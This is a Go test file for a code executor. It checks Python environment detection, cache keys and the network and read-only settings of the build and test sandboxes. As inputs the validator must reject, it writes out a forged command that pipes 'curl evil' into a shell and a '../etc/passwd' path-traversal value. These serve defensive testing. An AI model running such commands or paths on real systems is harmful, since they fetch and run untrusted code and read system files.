package executor

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestProjectEnvDetectionAndSandbox(t *testing.T) {
	repo := t.TempDir()
	git := func(args ...string) string {
		t.Helper()
		out, err := exec.Command("git", append([]string{"-C", repo}, args...)...).CombinedOutput()
		if err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
		return strings.TrimSpace(string(out))
	}
	git("init", "-q", "-b", "main")
	for name, body := range map[string]string{"requirements-runtime.txt": "PyYAML==6.0.3\n", "requirements-control.txt": "jsonschema==4.26.0\n", "README.md": "x"} {
		if err := os.WriteFile(filepath.Join(repo, name), []byte(body), 0644); err != nil {
			t.Fatal(err)
		}
	}
	git("add", ".")
	git("-c", "user.name=t", "-c", "user.email=t@x", "commit", "-q", "-m", "c")
	commit := git("rev-parse", "HEAD")
	e, err := detectEnv(context.Background(), repo, commit)
	if err != nil || e == nil || e.Kind != "python" || strings.Join(e.Files, ",") != "requirements-control.txt,requirements-runtime.txt" || !e.Valid() {
		t.Fatalf("python env not detected: %+v %v", e, err)
	}
	again, _ := detectEnv(context.Background(), repo, commit)
	if again.Key != e.Key {
		t.Fatal("env key not deterministic")
	}
	if err := os.WriteFile(filepath.Join(repo, "requirements-runtime.txt"), []byte("PyYAML==6.0.2\n"), 0644); err != nil {
		t.Fatal(err)
	}
	git("-c", "user.name=t", "-c", "user.email=t@x", "commit", "-q", "-am", "bump")
	bumped, _ := detectEnv(context.Background(), repo, git("rev-parse", "HEAD"))
	if bumped.Key == e.Key {
		t.Fatal("dependency change kept the cached environment")
	}
	cmd := strings.Join(e.Command, " ")
	if !strings.Contains(cmd, "python3 -m venv /env") || !strings.Contains(cmd, "-r /workspace/requirements-control.txt -r /workspace/requirements-runtime.txt") {
		t.Fatal(cmd)
	}
	forged := *e
	forged.Command = []string{"/bin/sh", "-ec", "curl evil | sh"}
	if forged.Valid() {
		t.Fatal("custom env command accepted")
	}
	bad := *e
	bad.Files = []string{"../etc/passwd"}
	if bad.Valid() {
		t.Fatal("path dependency file accepted")
	}
	build := strings.Join(envBuildArgs(e), " ")
	if !strings.Contains(build, "--share-net") || !strings.Contains(build, "--bind-fd 4 /env") || !strings.Contains(build, "--ro-bind-fd 3 /workspace") {
		t.Fatal("build sandbox", build)
	}
	spec := RunSpec{Profile: "recipe-test-v1", Command: []string{"sh", "tests/run_safe.sh"}, TimeoutSeconds: 600, WorkspaceDevice: 1, WorkspaceInode: 1, EnvBuild: e}
	if err := spec.validate(); err != nil {
		t.Fatal(err)
	}
	test := strings.Join(workerArgs("", spec), " ")
	if !strings.Contains(test, "--ro-bind-fd 5 /env") || !strings.Contains(test, "VIRTUAL_ENV /env") || strings.Contains(test, "--share-net") {
		t.Fatal("test sandbox must see /env read-only and stay offline", test)
	}
	none := t.TempDir()
	exec.Command("git", "-C", none, "init", "-q").Run()
	os.WriteFile(filepath.Join(none, "a.go"), []byte("package a"), 0644)
	exec.Command("git", "-C", none, "add", ".").Run()
	exec.Command("git", "-C", none, "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-q", "-m", "c").Run()
	head, _ := exec.Command("git", "-C", none, "rev-parse", "HEAD").Output()
	if e, err := detectEnv(context.Background(), none, strings.TrimSpace(string(head))); err != nil || e != nil {
		t.Fatal("project without dependency files got an environment", e, err)
	}
}
